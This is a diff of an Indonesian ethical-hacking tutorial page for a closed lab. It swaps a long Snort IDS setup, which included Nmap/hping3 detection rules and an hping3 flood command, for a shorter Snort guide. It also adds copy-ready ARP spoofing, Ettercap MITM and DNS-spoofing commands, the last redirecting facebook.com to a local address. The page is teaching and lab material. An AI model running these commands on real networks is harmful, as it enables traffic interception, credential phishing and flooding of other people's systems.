@@ -1,341 +1,184 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Peretasan Etis — CYBER SECURITY RIO ARDANA</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Peretasan Etis — Cyber Security Rio Ardana</title>
 
-  <!-- Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&family=Poppins:wght@400;600&family=Fira+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&family=Poppins:wght@400;600&family=Fira+Mono&display=swap" rel="stylesheet">
 
-  <link rel="stylesheet" href="pe.css"/>
+  <link rel="stylesheet" href="pe.css">
 </head>
 <body>
-  <!-- Page Transition Overlay -->
-  <div id="pt" class="pt-overlay" aria-hidden="true">
-    <div class="pt-grid"></div>
-    <div class="pt-bars"><span></span><span></span><span></span></div>
-  </div>
 
-  <!-- Interactive circuit background -->
-  <canvas id="circuit" aria-hidden="true"></canvas>
+<canvas id="circuit"></canvas>
 
-  <!-- Top bar -->
-  <header class="main-header">
-    <nav class="nav" aria-label="Utama">
-      <a class="brand" href="index.html">← Home</a>
-      <div class="nav-right">
-        <a href="keamanan_jaringan.html">Keamanan Jaringan</a>
-        <a href="peretasan_etis.html" class="active">Peretasan Etis</a>
+<header class="main-header">
+  <nav class="nav">
+    <a class="brand" href="index.html">← Home</a>
+    <div class="nav-right">
+      <a href="keamanan_jaringan.html">Keamanan Jaringan</a>
+      <a href="peretasan_etis.html" class="active">Peretasan Etis</a>
+    </div>
+  </nav>
+
+  <h1 class="glitch" data-text="PERETASAN ETIS">
+    PERETASAN <span>ETIS</span>
+  </h1>
+  <p class="subtitle">Ethical Hacking • IDS • MITM • DNS Spoofing</p>
+</header>
+
+<main id="content">
+
+<section class="intro">
+  <p>
+    Halaman ini berisi praktikum <strong>Ethical Hacking</strong> dan
+    <strong>Intrusion Detection System (IDS)</strong> yang dilakukan
+    pada lingkungan <strong>lab tertutup</strong>.
+  </p>
+  <p class="note">
+    ⚠️ Semua aktivitas hanya untuk edukasi dan pembelajaran.
+  </p>
+</section>
+
+<section class="accordion">
+
+<!-- ================= SNORT LENGKAP ================= -->
+<article class="acc-item open">
+  <button class="acc-head">
+    <span>Praktikum — Snort IDS</span>
+    <span class="chev">⌄</span>
+  </button>
+
+  <div class="acc-body">
+
+    <p>
+      <strong>Snort</strong> adalah Network Intrusion Detection System (NIDS)
+      yang bekerja dengan menganalisis paket jaringan berdasarkan rule.
+    </p>
+
+    <div class="step">
+      <h4>Langkah 1 — Update Sistem</h4>
+      <div class="code"><pre><code class="bash">sudo apt update && sudo apt upgrade -y</code></pre><button class="copy">Salin</button></div>
+    </div>
+
+    <div class="step">
+      <h4>Langkah 2 — Instalasi Snort</h4>
+      <div class="code"><pre><code class="bash">sudo apt install snort -y</code></pre><button class="copy">Salin</button></div>
+    </div>
+
+    <div class="step">
+      <h4>Langkah 3 — Verifikasi Instalasi</h4>
+      <div class="code"><pre><code class="bash">snort -V</code></pre><button class="copy">Salin</button></div>
+    </div>
+
+    <div class="step">
+      <h4>Langkah 4 — Tentukan Interface</h4>
+      <div class="code"><pre><code class="bash">ip a</code></pre><button class="copy">Salin</button></div>
+    </div>
+
+    <div class="step">
+      <h4>Langkah 5 — Edit snort.conf</h4>
+      <div class="code"><pre><code class="bash">sudo nano /etc/snort/snort.conf</code></pre><button class="copy">Salin</button></div>
+      <p class="note">Set variabel HOME_NET sesuai IP lokal.</p>
+    </div>
+
+    <div class="step">
+      <h4>Langkah 6 — Buat Rule Lokal</h4>
+      <div class="code"><pre><code class="bash">sudo nano /etc/snort/rules/local.rules</code></pre><button class="copy">Salin</button></div>
+    </div>
+
+    <div class="step">
+      <h4>Langkah 7 — Tambahkan Rule Uji</h4>
+      <div class="code">
+<pre><code class="bash">alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; sid:1000001; rev:1;)</code></pre>
+      <button class="copy">Salin</button>
       </div>
-    </nav>
+    </div>
 
-    <h1 class="glitch" data-text="PERETASAN ETIS">
-      PERETASAN <span>ETIS</span>
-    </h1>
-    <p class="subtitle">Tutorial • Snort IDS (berdasarkan langkah LinkedIn, CLI siap salin)</p>
-  </header>
+    <div class="step">
+      <h4>Langkah 8 — Test Konfigurasi</h4>
+      <div class="code"><pre><code class="bash">sudo snort -T -c /etc/snort/snort.conf</code></pre><button class="copy">Salin</button></div>
+    </div>
 
-  <main id="content">
-    <section class="intro">
+    <div class="step">
+      <h4>Langkah 9 — Jalankan Snort</h4>
+      <div class="code"><pre><code class="bash">sudo snort -A console -q -c /etc/snort/snort.conf -i eth0</code></pre><button class="copy">Salin</button></div>
+    </div>
+
+    <div class="step">
+      <h4>Langkah 10 — Simulasi Serangan</h4>
+      <div class="code"><pre><code class="bash">ping &lt;IP_TARGET&gt;</code></pre><button class="copy">Salin</button></div>
+    </div>
+
+    <div class="step">
+      <h4>Langkah 11 — Analisis Alert</h4>
       <p>
-        Di bawah ini adalah langkah-langkah **Snort (Kali/Ubuntu)** sesuai screenshot referensi:
-        **switch root → update & import key → install → konfigurasi <code>snort.lua</code> → buat <code>local.rules</code> dengan rules Nmap/hping3 → jalankan & uji → service systemd**.
+        Jika rule berjalan dengan benar, Snort akan menampilkan alert
+        ICMP Ping Detected pada terminal.
       </p>
-    </section>
+    </div>
 
-    <!-- Accordion -->
-    <section class="accordion" id="snort-accordion">
+  </div>
+</article>
 
-      <!-- 1. Root -->
-      <article class="acc-item">
-        <h3 class="sr-only">Switch to the Root User</h3>
-        <button class="acc-head" aria-expanded="false" aria-controls="p1" id="h1">
-          <span>1) Switch to the Root User</span>
-          <span class="chev" aria-hidden="true">▾</span>
-        </button>
-        <div class="acc-body" id="p1" role="region" aria-labelledby="h1">
-          <div class="code">
-<pre><code class="bash">sudo su</code></pre>
-            <button class="copy" type="button">Salin</button>
-          </div>
-        </div>
-      </article>
+<!-- ================= ARP SPOOFING ================= -->
+<article class="acc-item">
+  <button class="acc-head"><span>Praktikum — ARP Spoofing</span><span class="chev">⌄</span></button>
+  <div class="acc-body">
+    <div class="code"><pre><code class="bash">sudo apt install dsniff
+sudo arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1
+sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.100</code></pre><button class="copy">Salin</button></div>
+  </div>
+</article>
 
-      <!-- 2. Update + import Kali key -->
-      <article class="acc-item">
-        <h3 class="sr-only">Update Your System</h3>
-        <button class="acc-head" aria-expanded="false" aria-controls="p2" id="h2">
-          <span>2) Update Your System (import GPG key Kali + apt update)</span>
-          <span class="chev" aria-hidden="true">▾</span>
-        </button>
-        <div class="acc-body" id="p2" role="region" aria-labelledby="h2">
-          <div class="code">
-<pre><code class="bash">curl -fsSL https://archive.kali.org/archive-key.asc | sudo gpg --dearmor -o /usr/share/keyrings/kali-archive-keyring.gpg
+<!-- ================= ETTERCAP ================= -->
+<article class="acc-item">
+  <button class="acc-head"><span>Praktikum — MITM (Ettercap)</span><span class="chev">⌄</span></button>
+  <div class="acc-body">
+    <div class="code"><pre><code class="bash">sudo apt install ettercap-graphical
+sudo ettercap -G</code></pre><button class="copy">Salin</button></div>
+  </div>
+</article>
 
-apt update</code></pre>
-            <button class="copy" type="button">Salin</button>
-          </div>
-        </div>
-      </article>
+<!-- ================= DNS SPOOFING ================= -->
+<article class="acc-item">
+  <button class="acc-head"><span>Praktikum — DNS Spoofing</span><span class="chev">⌄</span></button>
+  <div class="acc-body">
+    <div class="code">
+<pre><code class="bash">sudo nano /etc/ettercap/etter.dns
+www.facebook.com A 192.168.1.50
+*.facebook.com A 192.168.1.50
 
-      <!-- 3. Install Snort + cek versi -->
-      <article class="acc-item">
-        <h3 class="sr-only">Install Snort</h3>
-        <button class="acc-head" aria-expanded="false" aria-controls="p3" id="h3">
-          <span>3) Install Snort & Verifikasi Versi</span>
-          <span class="chev" aria-hidden="true">▾</span>
-        </button>
-        <div class="acc-body" id="p3" role="region" aria-labelledby="h3">
-          <div class="code">
-<pre><code class="bash">apt install snort -y
+sudo ettercap -T -q -M arp -i wlan0 -P dns_spoof</code></pre>
+    <button class="copy">Salin</button>
+    </div>
+  </div>
+</article>
 
-snort -V</code></pre>
-            <button class="copy" type="button">Salin</button>
-          </div>
-          <p class="tip">Saat instalasi dari repo, biasanya Snort 2.x. Jika pakai Snort 3 build resmi, sintaks jalankan sedikit berbeda.</p>
-        </div>
-      </article>
+</section>
+</main>
 
-      <!-- 4. Masuk direktori config -->
-      <article class="acc-item">
-        <h3 class="sr-only">Navigate to the Snort Configuration Directory</h3>
-        <button class="acc-head" aria-expanded="false" aria-controls="p4" id="h4">
-          <span>4) Masuk Direktori Konfigurasi Snort</span>
-          <span class="chev" aria-hidden="true">▾</span>
-        </button>
-        <div class="acc-body" id="p4" role="region" aria-labelledby="h4">
-          <div class="code">
-<pre><code class="bash">cd /etc/snort/
+<footer>
+  <p>© 2025 Rio Ardana. All Rights Reserved.</p>
+</footer>
 
-ls -l</code></pre>
-            <button class="copy" type="button">Salin</button>
-          </div>
-        </div>
-      </article>
+<script>
+(function(){
+  document.querySelectorAll('.acc-head').forEach(h=>{
+    h.addEventListener('click',()=>{
+      const p=h.parentElement;
+      document.querySelectorAll('.acc-item').forEach(i=>i!==p && i.classList.remove('open'));
+      p.classList.toggle('open');
+    });
+  });
+  document.querySelectorAll('.copy').forEach(b=>{
+    b.onclick=()=>{navigator.clipboard.writeText(b.previousElementSibling.innerText);};
+  });
+})();
+</script>
 
-      <!-- 5. Edit snort.lua untuk include local.rules -->
-      <article class="acc-item">
-        <h3 class="sr-only">Configure Main Settings</h3>
-        <button class="acc-head" aria-expanded="false" aria-controls="p5" id="h5">
-          <span>5) Konfigurasi Utama di <code>snort.lua</code> (include <code>local.rules</code>)</span>
-          <span class="chev" aria-hidden="true">▾</span>
-        </button>
-        <div class="acc-body" id="p5" role="region" aria-labelledby="h5">
-          <div class="code">
-<pre><code class="bash">pico /etc/snort/snort.lua</code></pre>
-            <button class="copy" type="button">Salin</button>
-          </div>
-          <p class="note">Tambahkan blok berikut untuk memuat <code>/etc/snort/rules/local.rules</code>:</p>
-          <div class="code">
-<pre><code class="bash">ips =
-{
-  variables = default_variables,
-  rules = [[
-    include /etc/snort/rules/local.rules
-  ]]
-}</code></pre>
-            <button class="copy" type="button">Salin</button>
-          </div>
-          <p class="tip">Simpan (Ctrl+O → Enter) lalu keluar (Ctrl+X).</p>
-        </div>
-      </article>
-
-      <!-- 6. Buat local.rules dengan rules yang ditentukan -->
-      <article class="acc-item">
-        <h3 class="sr-only">Create Your Snort Rules</h3>
-        <button class="acc-head" aria-expanded="false" aria-controls="p6" id="h6">
-          <span>6) Buat <code>/etc/snort/rules/local.rules</code> (rules Nmap & hping3)</span>
-          <span class="chev" aria-hidden="true">▾</span>
-        </button>
-        <div class="acc-body" id="p6" role="region" aria-labelledby="h6">
-          <div class="code">
-<pre><code class="bash">pico /etc/snort/rules/local.rules</code></pre>
-            <button class="copy" type="button">Salin</button>
-          </div>
-          <p>Tempel baris rules berikut (satu baris per rule):</p>
-          <div class="code">
-<pre><code class="bash">alert tcp any any -&gt; any any (msg:"Nmap SYN Scan Detected"; flags:S; sid:1000001; rev:1;)
-alert tcp any any -&gt; any any (msg:"Nmap Xmas Scan Detected"; flags:FPU; sid:1000002; rev:1;)
-alert tcp any any -&gt; any any (msg:"Nmap Null Scan Detected"; flags:0; sid:1000003; rev:1;)
-alert icmp any any -&gt; any any (msg:"HPING3 ICMP Flood Detected"; sid:1000004; rev:1;)</code></pre>
-            <button class="copy" type="button">Salin</button>
-          </div>
-          <p class="tip">Simpan & keluar dari editor (Ctrl+O, Enter, Ctrl+X).</p>
-        </div>
-      </article>
-
-      <!-- 7. Jalankan Snort console -->
-      <article class="acc-item">
-        <h3 class="sr-only">Run Snort in Console Mode</h3>
-        <button class="acc-head" aria-expanded="false" aria-controls="p7" id="h7">
-          <span>7) Jalankan Snort (Console Mode) untuk Pengujian</span>
-          <span class="chev" aria-hidden="true">▾</span>
-        </button>
-        <div class="acc-body" id="p7" role="region" aria-labelledby="h7">
-          <p>Pantau interface tertentu:</p>
-          <div class="code">
-<pre><code class="bash"># Interface eksternal (contoh: eth0)
-sudo snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules -i eth0 -A alert_fast
-
-# Loopback (lo)
-sudo snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules -i lo -A alert_fast</code></pre>
-            <button class="copy" type="button">Salin</button>
-          </div>
-        </div>
-      </article>
-
-      <!-- 8. Simulate attacks -->
-      <article class="acc-item">
-        <h3 class="sr-only">Simulate Attacks for Testing</h3>
-        <button class="acc-head" aria-expanded="false" aria-controls="p8" id="h8">
-          <span>8) Simulasikan Serangan untuk Uji (Nmap & hping3)</span>
-          <span class="chev" aria-hidden="true">▾</span>
-        </button>
-        <div class="acc-body" id="p8" role="region" aria-labelledby="h8">
-          <p><strong>Nmap scans</strong> (jalankan dari host yang relevan):</p>
-          <div class="code">
-<pre><code class="bash"># SYN Scan
-nmap -sS localhost
-
-# Null Scan
-nmap -sN localhost
-
-# Xmas Scan
-nmap -sX localhost</code></pre>
-            <button class="copy" type="button">Salin</button>
-          </div>
-
-          <p style="margin-top:.6rem;"><strong>ICMP flood</strong> dengan hping3:</p>
-          <div class="code">
-<pre><code class="bash">sudo hping3 -1 -c 1000 -d 120 -S -w 64 --flood --rand-source localhost</code></pre>
-            <button class="copy" type="button">Salin</button>
-          </div>
-
-          <p class="tip">Jika konfigurasi benar, alert akan muncul di console sesuai pesan rule.</p>
-        </div>
-      </article>
-
-      <!-- 10–11. Systemd service -->
-      <article class="acc-item">
-        <h3 class="sr-only">Enable and Start the Snort Service</h3>
-        <button class="acc-head" aria-expanded="false" aria-controls="p9" id="h9">
-          <span>9–11) Buat/aktifkan service Snort (systemd) & verifikasi</span>
-          <span class="chev" aria-hidden="true">▾</span>
-        </button>
-        <div class="acc-body" id="p9" role="region" aria-labelledby="h9">
-          <p class="note">Jika kamu sudah punya unit service, gunakan perintah-perintah di bawah untuk mengelolanya.</p>
-          <div class="code">
-<pre><code class="bash">sudo systemctl daemon-reload
-
-sudo systemctl enable snort
-sudo systemctl start snort
-
-# stop / cek status
-sudo systemctl stop snort
-sudo systemctl status snort</code></pre>
-            <button class="copy" type="button">Salin</button>
-          </div>
-          <p class="tip">Jika belum ada unit, kamu bisa meniru contoh service sederhana di halaman ini (bagian “Logging & Autostart” pada Keamanan Jaringan) lalu sesuaikan command Snort-nya.</p>
-        </div>
-      </article>
-
-    </section>
-  </main>
-
-  <footer>
-    <p>© 2025 Rio Ardana. All Rights Reserved.</p>
-  </footer>
-
-  <!-- Scripts -->
-  <script>
-    // Accordion (smooth + ARIA + close-others)
-    (function(){
-      const items = [...document.querySelectorAll('.acc-item')];
-      const heads = [...document.querySelectorAll('.acc-head')];
-
-      function toggle(item, expand){
-        const btn = item.querySelector('.acc-head');
-        const will = expand !== undefined ? expand : !item.classList.contains('open');
-        items.forEach(i => { if(i!==item) { i.classList.remove('open'); i.querySelector('.acc-head').setAttribute('aria-expanded','false'); }});
-        item.classList.toggle('open', will);
-        btn.setAttribute('aria-expanded', String(will));
-      }
-
-      heads.forEach(h=>{
-        h.addEventListener('click', ()=> toggle(h.parentElement));
-        h.addEventListener('keydown', (e)=>{ if(e.key==='Enter'||e.key===' '){ e.preventDefault(); h.click(); }});
-      });
-
-      // Copy code buttons
-      document.querySelectorAll('.code .copy').forEach(b=>{
-        b.addEventListener('click', ()=>{
-          const pre = b.previousElementSibling;
-          navigator.clipboard.writeText(pre.innerText).then(()=>{
-            const old=b.textContent; b.textContent='Disalin ✓';
-            setTimeout(()=> b.textContent=old, 1100);
-          });
-        });
-      });
-    })();
-
-    // Circuit BG (same engine as halaman lain, diringkas)
-    (function(){
-      const canvas = document.getElementById('circuit');
-      const ctx = canvas.getContext('2d', { alpha: true });
-      let W,H,DPR,nodes=[],links=[],mouse={x:-9999,y:-9999};
-      function resize(){ DPR=Math.min(window.devicePixelRatio||1,2);
-        W=canvas.width=Math.floor(innerWidth*DPR); H=canvas.height=Math.floor(innerHeight*DPR);
-        canvas.style.width=`${W/DPR}px`; canvas.style.height=`${H/DPR}px`; build(); }
-      function build(){ nodes=[]; links=[]; const spacing=Math.max(90,Math.min(140,Math.floor(W/DPR/9)*10));
-        const jitter=spacing*0.35; const cols=Math.ceil((W/DPR)/spacing)+2; const rows=Math.ceil((H/DPR)/spacing)+2;
-        for(let r=0;r<rows;r++) for(let c=0;c<cols;c++){ const x=(c*spacing+(Math.random()*jitter-jitter/2))*DPR;
-          const y=(r*spacing+(Math.random()*jitter-jitter/2))*DPR; nodes.push({x,y,ox:x,oy:y,z:0.6+Math.random()*0.8,p:Math.random()*6.28}); }
-        const maxD=(spacing*1.15)*DPR; for(let i=0;i<nodes.length;i++){ const a=nodes[i]; let k=0;
-          for(let j=i+1;j<nodes.length && k<3;j++){ const b=nodes[j]; const d=Math.hypot(a.x-b.x,a.y-b.y); if(d<maxD){ links.push({a:b,b:a,d}); k++; } } } }
-      addEventListener('mousemove',e=>{const r=canvas.getBoundingClientRect(); mouse.x=(e.clientX-r.left)*DPR; mouse.y=(e.clientY-r.top)*DPR;},{passive:true});
-      addEventListener('mouseleave',()=>{mouse.x=mouse.y=-9999;});
-      function tick(){ ctx.clearRect(0,0,W,H);
-        for(const n of nodes){ n.p+=0.008; n.x+=Math.cos(n.p)*0.6*n.z; n.y+=Math.sin(n.p)*0.6*n.z; n.x+=(n.ox-n.x)*0.02; n.y+=(n.oy-n.y)*0.02; }
-        for(const L of links){ const ax=L.a.x,ay=L.a.y,bx=L.b.x,by=L.b.y; const midx=(ax+bx)/2, midy=(ay+by)/2;
-          const md=Math.hypot(midx-mouse.x, midy-mouse.y); let a=0.12*(1-Math.min(L.d/(300*DPR),1)); if(md<220*DPR) a+=(1-md/(220*DPR))*0.35;
-          ctx.strokeStyle=`rgba(0,212,255,${a.toFixed(3)})`; ctx.beginPath(); const cx=(ax+bx)/2+(ay-by)*0.06, cy=(ay+by)/2+(bx-ax)*0.06; ctx.quadraticCurveTo(cx,cy,bx,by); ctx.stroke();}
-        for(const n of nodes){ const d=Math.hypot(n.x-mouse.x,n.y-mouse.y); let g=0.25; if(d<160*DPR) g+=(1-d/(160*DPR))*0.75;
-          ctx.fillStyle=`rgba(0,212,255,${0.12*g})`; ctx.beginPath(); ctx.arc(n.x,n.y,8*DPR,0,6.28); ctx.fill();
-          ctx.fillStyle=`rgba(180,240,255,${0.55*g})`; ctx.beginPath(); ctx.arc(n.x,n.y,2.1*DPR,0,6.28); ctx.fill();}
-        requestAnimationFrame(tick); }
-      resize(); addEventListener('resize',resize,{passive:true}); requestAnimationFrame(tick);
-    })();
-
-    // Page Transition Controller
-    (function(){
-      const overlay = document.getElementById('pt');
-      const NAV_SEL = 'a[href]';
-      requestAnimationFrame(()=> {
-        overlay.classList.add('pt-enter');
-        requestAnimationFrame(()=> {
-          overlay.classList.add('pt-enter-active');
-          overlay.addEventListener('animationend', () => {
-            overlay.classList.remove('pt-enter','pt-enter-active');
-          }, { once:true });
-        });
-      });
-      document.addEventListener('click', (e)=>{
-        const t = e.target.closest(NAV_SEL);
-        if(!t) return;
-        const href = t.getAttribute('href');
-        if(!href || href.startsWith('#') || href.startsWith('mailto:') || href.startsWith('http')) return;
-        e.preventDefault();
-        overlay.classList.add('pt-exit');
-        requestAnimationFrame(()=> {
-          overlay.classList.add('pt-exit-active');
-          overlay.addEventListener('animationend', ()=>{ window.location.href = href; }, { once:true });
-        });
-      });
-      window.addEventListener('pageshow', (e)=>{ if(e.persisted){ overlay.className = 'pt-overlay'; }});
-    })();
-  </script>
 </body>
 </html>
